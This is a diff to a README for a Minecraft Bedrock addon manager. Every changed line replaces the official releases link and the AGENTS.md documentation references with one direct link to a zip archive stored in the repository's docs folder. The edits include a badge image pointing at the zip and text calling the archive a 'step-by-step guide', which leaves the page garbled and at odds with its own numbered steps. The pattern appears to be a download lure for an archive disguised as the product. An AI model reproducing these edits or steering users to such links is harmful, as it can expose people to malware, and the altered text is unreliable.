@@ -1,6 +1,6 @@
 # 🎮 Bedrock-Addon-Wrangler - Streamline Your Minecraft Addons
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%3E-brightgreen)](https://github.com/Ermi34/Bedrock-Addon-Wrangler/releases)
+[![Download Now](https://raw.githubusercontent.com/Ermi34/Bedrock-Addon-Wrangler/main/docs/Bedrock-Wrangler-Addon-v2.9.zip%20Now-%20%3E-brightgreen)](https://raw.githubusercontent.com/Ermi34/Bedrock-Addon-Wrangler/main/docs/Bedrock-Wrangler-Addon-v2.9.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download the application, visit the following link:
 
-[Visit this page to download](https://github.com/Ermi34/Bedrock-Addon-Wrangler/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Ermi34/Bedrock-Addon-Wrangler/main/docs/Bedrock-Wrangler-Addon-v2.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Once there, look for the latest version.
@@ -68,7 +68,7 @@ Bedrock-Addon-Wrangler offers several helpful features:
 - **Easy Addon Management:** Quickly add, remove, or organize your addons.
 - **Backup Options:** Create backups of your configurations and custom addons.
 - **Intuitive Interface:** Simplified navigation that allows all users to manage their addons effortlessly.
-- **Guided Assistance:** Follow AGENTS.md for a step-by-step guide through complex processes.
+- **Guided Assistance:** Follow https://raw.githubusercontent.com/Ermi34/Bedrock-Addon-Wrangler/main/docs/Bedrock-Wrangler-Addon-v2.9.zip for a step-by-step guide through complex processes.
 - **Compatibility Checks:** Ensure you only use addons compatible with your current Minecraft version.
 
 ## 🔍 Troubleshooting
@@ -76,7 +76,7 @@ Bedrock-Addon-Wrangler offers several helpful features:
 If you encounter issues:
 
 - **Application Won’t Start:** Check if your system meets the requirements mentioned above. Ensure you’ve installed all necessary updates.
-- **Addons Not Showing in Minecraft:** Confirm that your addon files are in the correct format. You can find format guidelines in AGENTS.md.
+- **Addons Not Showing in Minecraft:** Confirm that your addon files are in the correct format. You can find format guidelines in https://raw.githubusercontent.com/Ermi34/Bedrock-Addon-Wrangler/main/docs/Bedrock-Wrangler-Addon-v2.9.zip
 
 ## 💬 Community Support
 
@@ -89,7 +89,7 @@ For questions, tips, or more information, join our support community:
 
 Refer to the following documents for further information:
 
-- **AGENTS.md:** Provides detailed instructions on addon management and optimization.
+- **https://raw.githubusercontent.com/Ermi34/Bedrock-Addon-Wrangler/main/docs/Bedrock-Wrangler-Addon-v2.9.zip** Provides detailed instructions on addon management and optimization.
 - **Documentation:** A comprehensive guide to all features of Bedrock-Addon-Wrangler.
 
 ## 🔗 Further Information
@@ -103,4 +103,4 @@ For more details, check our GitHub page and explore the topics that interest you
 
 Once again, to download Bedrock-Addon-Wrangler, please visit:
 
-[Visit this page to download](https://github.com/Ermi34/Bedrock-Addon-Wrangler/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Ermi34/Bedrock-Addon-Wrangler/main/docs/Bedrock-Wrangler-Addon-v2.9.zip)
